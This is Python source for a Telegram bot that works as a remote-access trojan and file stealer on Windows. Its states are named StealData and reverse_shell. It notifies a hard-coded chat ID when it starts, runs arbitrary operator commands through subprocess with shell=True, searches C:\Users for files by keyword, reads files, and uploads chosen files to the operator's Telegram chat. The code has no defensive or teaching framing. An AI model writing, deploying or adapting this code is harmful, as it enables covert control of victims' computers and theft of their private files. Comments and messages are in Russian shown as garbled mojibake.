
from aiogram import Dispatcher, Bot
from aiogram.filters import Command, CommandStart
import asyncio
from aiogram.types import Message
from pyexpat.errors import messages
from aiogram.exceptions import TelegramBadRequest
from aiogram import F
from aiogram.types import FSInputFile
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.context import FSMContext
import subprocess
import os 



TOKEN  = 'TOKEN'
bot = Bot(TOKEN)
dp = Dispatcher()
CHAT_ID = "964584467"

def search_one_word(user_text):
    founded_files = [] 
    other_dirs = []
    other_files = []
    for root, dir, files in os.walk(r'C:\Users') :
        try:
            
            for file in files:
                for word in user_text:
                    if word in file.lower():
                        full_path = os.path.join(root, file)
                        founded_files.append(f"{file} -- {full_path} \n")
        except PermissionError:
            print("–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –ø—Ä–∞–≤")
    
    return founded_files, other_dirs, other_files
    

def search_many_words(user_text):
    founded_files = []
    for root, dir, files in os.walk(r'C:\Users') :
        try:
            for file in files:
                for word in user_text:
                    if word in file.lower():
                        full_path = os.path.join(root, file)
                        founded_files.append(f"{file} -- {full_path} \n")
        except PermissionError:
            print("–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –ø—Ä–∞–≤")
    return founded_files


#–§—É–Ω—Ü–∏—è –ø—Ä–æ—á—Ç–µ–Ω–∏—è —Ñ–∞–π–ª–æ–≤ 
def read_file_fu(file_path):
    try:
        ext = os.path.splitext(file_path)[1].lower()
        text_extensions = ['.txt', '.py', '.js', '.html', '.css', '.md', '.json', '.xml', '.csv']
        if ext in text_extensions:
            with open(file_path, 'r', encoding="utf-8") as file:
                return file.read()
        else:
            return f"–ë–∏–Ω–∞—Ä–Ω—ã–π —Ñ–∞–π–ª {ext} - —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–æ –∫–∞–∫ —Ç–µ–∫—Å—Ç"
        
    except Exception as e:
        print('–û—à–∏–±–∫–∞  —á—Ç–µ–Ω–∏—è —Ñ–∞–π–ª–∞')


def show_files(user_text="", default_path=r'C:\\'):
    if user_text.strip():
        search_path = os.path.join(default_path, user_text.strip())
    else:
        search_path = default_path
    
    files_list = []
    try:
        if os.path.exists(search_path):
            items = os.listdir(search_path)
            for item in items:
                full_path = os.path.join(search_path, item)
                if os.path.isdir(full_path):
                    files_list.append(f"üìÅ {item}")
                else:
                    files_list.append(f"üìÑ {item}")
        else:
            files_list.append("–ü—É—Ç—å –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç")
    except PermissionError:
        files_list.append("–ì–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –ø—Ä–∞–≤")
    except Exception as e:
        files_list.append(f"–û—à–∏–±–∫–∞: {e}")
    
    return files_list


def find(directory, find_file):
    results = []
    
    for root, dirs, files in os.walk(rf'C:\{directory}'):
        try:
            if "-f" in find_file:
                search_words = [word for word in find_file if word != "-f"]
                for filename in files:
                    if filename in search_words:
                        full_path = os.path.join(root, filename)
                        results.append(f"{filename} ----- {full_path}")
            else:
                for filename in files:
                    for word in find_file:
                        if word.lower() in filename.lower(): 
                            full_path = os.path.join(root, filename)
                            results.append(f"{filename} ----- {full_path}")
                            break

                for dirname in dirs:
                    for word in find_file:
                        if word.lower() in dirname.lower():
                            full_path = os.path.join(root, dirname)
                            results.append(f"[–ü–ê–ü–ö–ê] {dirname} ----- {full_path}")
                            break
                            
        except PermissionError:
            results.append("–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –ø—Ä–∞–≤ –¥–ª—è –Ω–µ–∫–æ—Ç–æ—Ä—ã—Ö –ø–∞–ø–æ–∫")
            continue
    
    return results if results else ["–ù–∏—á–µ–≥–æ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ"]
# print(search_one_word("nude"))
class StealData(StatesGroup):
    waiting_for_action = State()
    waiting_for_word = State()
    find_one = State()
    reading_file = State()
    send_file = State()
    show_files = State()
    reverse_shell = State()

@dp.message(CommandStart())
async def start(message: Message, state: FSMContext):
    print(message.chat.id)
    await state.set_state(StealData.waiting_for_action)
    await message.answer("–í–≤–µ–¥–∏—Ç–µ –∫–æ–º–∞–Ω–¥—É")
    await message.answer("–î–æ—Å—Ç—É–ø–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã: /shell, /find, /read, /send, /show, /help")


@dp.message(StealData.waiting_for_action)
async def action(message: Message, state: FSMContext):
    
    user_command = message.text.lower()
    
    valid_comands = ['/find', '/read', '/send', '/show', '/shell', '/help']
    
    if user_command in valid_comands:
        await message.answer(f"–í—ã–ø–æ–ª–Ω—è—é –∫–æ–º–∞–Ω–¥—É: {user_command}")
        if user_command == "/read":
            await message.answer("–ù–∞–ø–∏—à–∏—Ç–µ –ø—É—Ç—å –¥–æ —Ñ–∞–π–ª–∞: ")
            await state.set_state(StealData.reading_file)  
        if user_command == "/find":
            await message.answer("–ù–∞–ø–∏—à–∏ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é –æ—Ç –∫–æ—Ç–æ—Ä–æ–π —Ö–æ—á–µ—à—å –Ω–∞—á–∞—Ç—å –∏—Å–∫–∞—Ç—å: ")
            await state.set_state(StealData.find_one)
        if user_command == "/send":
            await message.answer("–ù–∞–ø–∏—à–∏—Ç–µ –ø—É—Ç—å –¥–æ —Ñ–∞–π–ª–∞: ")
            await state.set_state(StealData.send_file)
        if user_command == "/show":
            await message.answer("–ù–∞–ø–∏—à–∏—Ç–µ –ø—É—Ç—å –¥–æ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏: ")
            await state.set_state(StealData.show_files)    
        if user_command == "/shell":
            await message.answer("–ù–∞–ø–∏—à–∏—Ç–µ –∫–æ–º–∞–Ω–¥—É: ")
            await state.set_state(StealData.reverse_shell)
        if user_command == "/help":
            await message.answer("–î–æ—Å—Ç—É–ø–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã: /shell, /find, /read, /send, /show /help")
            await message.answer("""**üñ•Ô∏è Windows CMD - –®–ø–∞—Ä–≥–∞–ª–∫–∞**

**üìÅ –ù–∞–≤–∏–≥–∞—Ü–∏—è:**
‚Ä¢ `cd` - –ø–æ–∫–∞–∑–∞—Ç—å —Ç–µ–∫—É—â—É—é –ø–∞–ø–∫—É
‚Ä¢ `cd C:\\path\\to\\dir` - –ø–µ—Ä–µ–π—Ç–∏ –≤ –ø–∞–ø–∫—É
‚Ä¢ `dir` - —Å–ø–∏—Å–æ–∫ —Ñ–∞–π–ª–æ–≤
‚Ä¢ `cd ..` - –≤–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞ —É—Ä–æ–≤–µ–Ω—å –≤—ã—à–µ

**üìÑ –§–∞–π–ª—ã –∏ –ø–∞–ø–∫–∏:**
‚Ä¢ `copy nul file.txt` - —Å–æ–∑–¥–∞—Ç—å —Ñ–∞–π–ª
‚Ä¢ `mkdir folder` - —Å–æ–∑–¥–∞—Ç—å –ø–∞–ø–∫—É
‚Ä¢ `del file.txt` - —É–¥–∞–ª–∏—Ç—å —Ñ–∞–π–ª
‚Ä¢ `rmdir folder` - —É–¥–∞–ª–∏—Ç—å –ø–∞–ø–∫—É
‚Ä¢ `rename old new` - –ø–µ—Ä–µ–∏–º–µ–Ω–æ–≤–∞—Ç—å
‚Ä¢ `copy file1 file2` - –∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å
‚Ä¢ `move file.txt dir\\` - –ø–µ—Ä–µ–º–µ—Å—Ç–∏—Ç—å

**üëÄ –ü—Ä–æ—Å–º–æ—Ç—Ä —Ñ–∞–π–ª–æ–≤:**
‚Ä¢ `type file.txt` - –ø–æ–∫–∞–∑–∞—Ç—å —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ

**üåê –°–µ—Ç—å:**
‚Ä¢ `ping site.com` - –ø—Ä–æ–≤–µ—Ä–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è
‚Ä¢ `ipconfig` - –ø–æ–∫–∞–∑–∞—Ç—å IP
‚Ä¢ `tracert site.com` - —Ç—Ä–∞—Å—Å–∏—Ä–æ–≤–∫–∞
‚Ä¢ `netstat -an` - –æ—Ç–∫—Ä—ã—Ç—ã–µ –ø–æ—Ä—Ç—ã

**‚öôÔ∏è –ü—Ä–æ—Ü–µ—Å—Å—ã:**
‚Ä¢ `tasklist` - —Å–ø–∏—Å–æ–∫ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤
‚Ä¢ `taskkill /PID 1234` - –∑–∞–≤–µ—Ä—à–∏—Ç—å –ø—Ä–æ—Ü–µ—Å—Å
‚Ä¢ `systeminfo` - –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Å–∏—Å—Ç–µ–º–µ

**üîç –ü–æ–∏—Å–∫:**
‚Ä¢ `dir /s *file*` - –ø–æ–∏—Å–∫ —Ñ–∞–π–ª–∞
‚Ä¢ `find "text" file.txt` - –ø–æ–∏—Å–∫ —Ç–µ–∫—Å—Ç–∞ –≤ —Ñ–∞–π–ª–µ""", parse_mode="Markdown")

            await state.set_state(StealData.waiting_for_action)
    if user_command not in ['/find' ,'/read', '/send', '/show', '/shell', '/help']:
        await message.answer("‚ùå –ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω–∞—è –∫–æ–º–∞–Ω–¥–∞!")
        await message.answer("–î–æ—Å—Ç—É–ø–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã: /shell, /find, /read, /send, /show /help")
        return


@dp.message(StealData.reading_file)
async def read_file(message: Message, state: FSMContext):
    path_from_user = message.text
    if path_from_user.lower() == "exit":
        await message.answer("–í—ã—Ö–æ–¥ –∏–∑ —Ä–µ–∂–∏–º–∞ read")
        await message.answer("–î–æ—Å—Ç—É–ø–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã: /shell, /find, /read, /send, /show /help")
        await state.set_state(StealData.waiting_for_action)
        return
    result = read_file_fu(path_from_user)
    if result is None:
        await message.answer("–û—à–∏–±–∫–∞ —á—Ç–µ–Ω–∏—è —Ñ–∞–π–ª–∞")
        return
    
    if len(result) > 3500:
        await message.answer(f"–í—ã–≤–æ–¥ —Å–ª–∏—à–∫–æ–º –¥–ª–∏–Ω–Ω—ã–π ({len(result)} —Å–∏–º–≤–æ–ª–æ–≤)")
        await message.answer("–ü–µ—Ä–≤—ã–µ 3000 —Å–∏–º–≤–æ–ª–æ–≤:")
        await message.answer(f"```\n{result[:3000]}\n```", parse_mode="Markdown")
    else:
        await message.answer(f"```\n{result}\n```", parse_mode="Markdown")
        

    

@dp.message(StealData.find_one)
async def com_search(message: Message, state: FSMContext):
    directory = message.text.strip() 
    
    if directory.lower() == "exit":
        await message.answer("–í—ã—Ö–æ–¥ –∏–∑ —Ä–µ–∂–∏–º–∞ find")
        await state.set_state(StealData.waiting_for_action)
        return
    
    await state.update_data(directory=directory)
    await message.answer("–¢–µ–ø–µ—Ä—å –≤–≤–µ–¥–∏—Ç–µ —á—Ç–æ —Ö–æ—Ç–∏—Ç–µ –Ω–∞–π—Ç–∏:")
    await state.set_state(StealData.waiting_for_word)

@dp.message(StealData.waiting_for_word)
async def search_word(message: Message, state: FSMContext):
    search_word = message.text.strip().split()
    
    if search_word[0].lower() == "exit":
        await message.answer("–í—ã—Ö–æ–¥ –∏–∑ —Ä–µ–∂–∏–º–∞ find") 
        await message.answer("–î–æ—Å—Ç—É–ø–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã: /shell, /find, /read, /send, /show /help")
        await state.set_state(StealData.waiting_for_action)
        return
    
    data = await state.get_data()
    directory = data.get("directory")
    
    result = find(directory, search_word)
    result_str = "\n".join(result)
    if len(result_str) > 3500:
        await message.answer(f"–í—ã–≤–æ–¥ —Å–ª–∏—à–∫–æ–º –¥–ª–∏–Ω–Ω—ã–π ({len(result_str)} —Å–∏–º–≤–æ–ª–æ–≤)")
        await message.answer("–ü–µ—Ä–≤—ã–µ 3000 —Å–∏–º–≤–æ–ª–æ–≤:")
        await message.answer(f"```\n{result_str[:3000]}\n```", parse_mode="Markdown")
    else:
        await message.answer(f"```\n{result_str}\n```", parse_mode="Markdown")
    
    await state.set_state(StealData.waiting_for_action)



@dp.message(StealData.show_files)
async def ls(message: Message, state: FSMContext):
    path_from_user = message.text
    if path_from_user.lower() == "exit":
        await message.answer("–í—ã—Ö–æ–¥ –∏–∑ —Ä–µ–∂–∏–º–∞ find_one")
        await message.answer("–î–æ—Å—Ç—É–ø–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã: /shell, /find, /read, /send, /show /help")
        await state.set_state(StealData.waiting_for_action)
        return
    result = show_files(path_from_user)
    result_str = "\n".join(result)
    try:
        await message.answer(result_str)
    except TelegramBadRequest as e:
        if "message is too long" in str(e):
            await message.answer(f"–ù–∞–π–¥–µ–Ω–æ {len(result)} —Ñ–∞–π–ª–æ–≤, –Ω–æ —Å–ø–∏—Å–æ–∫ —Å–ª–∏—à–∫–æ–º –¥–ª–∏–Ω–Ω—ã–π –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏")
            await message.answer("–ü–µ—Ä–≤—ã–µ 5 —Ñ–∞–π–ª–æ–≤:")
            short_list = "\n".join(result[:5])
            await message.answer(short_list)

@dp.message(StealData.reverse_shell)
async def shell(message: Message, state: FSMContext):
    command = message.text
    if command.lower() == "exit":
        await message.answer("–í—ã—Ö–æ–¥ –∏–∑ —Ä–µ–∂–∏–º–∞ shell")
        await message.answer("–î–æ—Å—Ç—É–ø–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã: /shell, /find, /read, /send, /show /help")
        await state.set_state(StealData.waiting_for_action)
        return
    
    # –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ –æ–ø–∞—Å–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã
    dangerous_commands = ['cmd', 'powershell', 'python', 'node', 'mysql', 'psql']
    if command.lower().strip() in dangerous_commands:
        await message.answer(f"‚ùå –ö–æ–º–∞–Ω–¥–∞ '{command}' –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω–∞ (–º–æ–∂–µ—Ç –∑–∞–≤–∏—Å–Ω—É—Ç—å)")
        return
    
    try:
        result = subprocess.run(command, shell=True, capture_output=True, timeout=30, encoding="cp866",  errors="replace")
        
        output = result.stdout or result.stderr
        
        if not output:
            output = "–ö–æ–º–∞–Ω–¥–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∞ –±–µ–∑ –≤—ã–≤–æ–¥–∞"
        
        if len(output) > 3500:
            await message.answer(f"–í—ã–≤–æ–¥ —Å–ª–∏—à–∫–æ–º –¥–ª–∏–Ω–Ω—ã–π ({len(output)} —Å–∏–º–≤–æ–ª–æ–≤)")
            await message.answer("–ü–µ—Ä–≤—ã–µ 3000 —Å–∏–º–≤–æ–ª–æ–≤:")
            await message.answer(f"```\n{output[:3000]}\n```", parse_mode="Markdown")
        else:
            await message.answer(f"```\n{output}\n```", parse_mode="Markdown")

    except subprocess.TimeoutExpired:
        await message.answer("–ö–æ–º–∞–Ω–¥–∞ –ø—Ä–µ–≤—ã—Å–∏–ª–∞ –≤—Ä–µ–º—è –æ–∂–∏–¥–∞–Ω–∏—è (30 —Å–µ–∫)")
    except Exception as e:
        await message.answer(f"–û—à–∏–±–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è: {e}")


@dp.message(StealData.send_file)
async def send_file(message: Message, state: FSMContext):
    

    file_path = message.text
    if file_path.lower() == "exit":
        await message.answer("–í—ã—Ö–æ–¥ –∏–∑ —Ä–µ–∂–∏–º–∞ shell")
        await message.answer("–î–æ—Å—Ç—É–ø–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã: /shell, /find, /read, /send, /show /help")
        await state.set_state(StealData.waiting_for_action)
        return
    try:
        document = FSInputFile(file_path)
        await bot.send_document(chat_id=CHAT_ID, document=document, 
                            caption=f"–§–∞–π–ª: {file_path}")
    except FileNotFoundError:
        await message.answer("–§–∞–π–ª –Ω–µ –Ω–∞–π–¥–µ–Ω")
    except Exception as e:
        await message.answer(f"–û—à–∏–±–∫–∞: {e}")
    


async def main():
    await bot.send_message(chat_id=CHAT_ID, text = "Bot was started")
    await bot.send_message(chat_id=CHAT_ID, text = "–ù–∞–ø–∏—à–∏ –∫–æ–º–∞–Ω–¥—É /start , —á—Ç–æ–±—ã –Ω–∞—á–∞—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –±–æ—Ç–æ–º")
    await dp.start_polling(bot)    

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except Exception as e:
        print(f"–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ {e}")


